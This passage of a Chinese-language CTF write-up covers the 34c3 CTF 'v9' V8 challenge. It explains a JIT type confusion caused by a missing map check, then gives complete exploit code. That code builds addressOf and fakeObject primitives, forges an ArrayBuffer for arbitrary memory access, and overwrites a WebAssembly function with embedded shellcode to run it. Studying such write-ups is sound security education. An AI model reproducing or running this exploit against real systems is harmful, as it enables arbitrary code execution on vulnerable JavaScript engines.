       opt(dict,(o)=>i);
    }
    print(opt(dict,(o)=>{o.a = dict}));
测试发现确实发生了类型混淆
    root@ubuntu:~/Desktop/v8/34c3ctf-v9/x64.debug# ./d8 poc.js
    1.8632743560757e-310
分析IR图
可以看到，在调用完函数后，没有对dict的类型重新进行检查，那么，我们在函数里改变了dict里a属性的类型，但是代码仍然用的是对待原来`double
elements`的方式来取出值，由此发生类型混淆
## 0x03 漏洞利用
首先构造`addressOf`原语
    function addressOf_opt(dict,f) {
       var x = dict.a;
       f(dict);
       return dict.a;
    }
    var double_dict = {a:1.1};
    for (var i=0;i1);
       addressOf_opt(double_dict,(o)=>2);
       addressOf_opt(double_dict,(o)=>3);
    }
    function addressOf(obj) {
       var x = addressOf_opt(double_dict,(o)=>{o.a = obj});
       return [u64_h(x),u64_l(x) - 0x1];
    }
然后构造`fakeObject`原语
    function fakeObject_opt(dict,f,addr) {
       var x = dict.b;
       f(dict);
       dict.b = addr;
       return dict;
    }
    var obj = {};
    var obj_dict = {b:2.2};
    for (var i=0;i1,1.1);
       fakeObject_opt(obj_dict,(o)=>2,2.2);
       fakeObject_opt(obj_dict,(o)=>3,3.3);
    }
    function fakeObject(addr_h,addr_l) {
       var obj1 = fakeObject_opt(obj_dict,(o)=>{o.b = obj;},p64f(addr_l+0x1,addr_h)).b;
       return obj1;
    }
在构造fakeObject原语时，在`fakeObject_opt`时，我们没有直接返回`dict.b`而是返回`dict`对象，因为我们在前一句有`dict.b
= addr;`，在与`return`之间没有进行其他逃逸操作，因此直接返回`dict.b`会在`Escape Analyse`阶段折叠掉。  
构造好这两个原语以后，就是常规利用了  
exp
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function u64_l(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(0,true);
    }
    function u64_h(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(4,true);
    }
    function addressOf_opt(dict,f) {
       var x = dict.a;
       f(dict);
       return dict.a;
    }
    var double_dict = {a:1.1};
    for (var i=0;i1);
       addressOf_opt(double_dict,(o)=>2);
       addressOf_opt(double_dict,(o)=>3);
    }
    function addressOf(obj) {
       var x = addressOf_opt(double_dict,(o)=>{o.a = obj});
       return [u64_h(x),u64_l(x) - 0x1];
    }
    function addressOf2_opt(dict,f) {
       var x = dict.a2;
       f(dict);
       return dict.a2;
    }
    var double_dict2 = {a2:1.1};
    for (var i=0;i1);
       addressOf2_opt(double_dict2,(o)=>2);
       addressOf2_opt(double_dict2,(o)=>3);
    }
    function addressOf2(obj) {
       var x = addressOf2_opt(double_dict2,(o)=>{o.a2 = obj});
       return [u64_h(x),u64_l(x) - 0x1];
    }
    function fakeObject_opt(dict,f,addr) {
       var x = dict.b;
       f(dict);
       dict.b = addr;
       return dict;
    }
    var obj = {};
    var obj_dict = {b:2.2};
    for (var i=0;i1,1.1);
       fakeObject_opt(obj_dict,(o)=>2,2.2);
       fakeObject_opt(obj_dict,(o)=>3,3.3);
    }
    function fakeObject(addr_h,addr_l) {
       var obj1 = fakeObject_opt(obj_dict,(o)=>{o.b = obj;},p64f(addr_l+0x1,addr_h)).b;
       return obj1;
    }
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12];
    var d = addressOf(faker);
    var faker_addr_h = d[0];
    var faker_addr_l = d[1];
    print('faker_addr='+faker_addr_h.toString(16) + faker_addr_l.toString(16));
    d = addressOf2(func);
    var wasm_shellcode_ptr_addr_h = d[0];
    var wasm_shellcode_ptr_addr_l = d[1] + 0x38;
    print('wasm_shellcode_ptr=' + wasm_shellcode_ptr_addr_h.toString(16) + wasm_shellcode_ptr_addr_l.toString(16));
    var element_addr_l = faker_addr_l + 0x40;
    print('element_addr=' + faker_addr_h.toString(16) + element_addr_l.toString(16));
    //fake a ArrayBuffer's Map
    faker[0] = p64f(0,0);
    faker[1] = p64f(0x0f00000a,0x001900c6);
    faker[2] = p64f(0x082003ff,0);
    faker[3] = p64f(0,0);
    //faker a ArrayBuffer
    faker[4] = p64f(element_addr_l+0x1,faker_addr_h); //map
    faker[5] = p64f(0,0); //properties
    faker[6] = p64f(0,0); //elements
    faker[7] = p64f(0,0x100); //length
    faker[8] = p64f(wasm_shellcode_ptr_addr_l,wasm_shellcode_ptr_addr_h);
    faker[9] = faker[8];
    faker[10] = p64f(0x100,0)
    faker[11] = p64f(0x4,0);
    var arb_ArrayBuffer = fakeObject(faker_addr_h,element_addr_l+0x20);
    var adv = new DataView(arb_ArrayBuffer);
    d = adv.getFloat64(0,true);
    var wasm_shellcode_addr_h = u64_h(d);
    var wasm_shellcode_addr_l = u64_l(d) + 0x5f;
    print('wasm_shellcode_addr=' + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));
    faker[8] = p64f(wasm_shellcode_addr_l,wasm_shellcode_addr_h);
    //替换wasm的shellcode
    for (var i=0;i<shellcode.length;i++) {
       adv.setUint32(i*4,shellcode[i],true);
    }
    //执行shellcode
    func();
## 0x04 参考
[从一道CTF题零基础学V8漏洞利用](https://www.freebuf.com/vuls/203721.html)  
[redundancy elimination reducer in v8 and 34c3 ctf
v9](https://www.dazhuanlan.com/2020/05/25/5ecbaa7260f9f/)
## 0x05 感想
在v8的JIT代码生成过程中，会使用IR来分析程序并且进行优化，v8的IR图使用`sea of
node`思想，其中`checkmaps`节点是用来做`deoptimization`的依据，`checkmaps`节点用于检查对象类型是否符合，如果符合，则直接执行接下来的JIT代码，否则会使用`deoptimization`，以确保类型正确。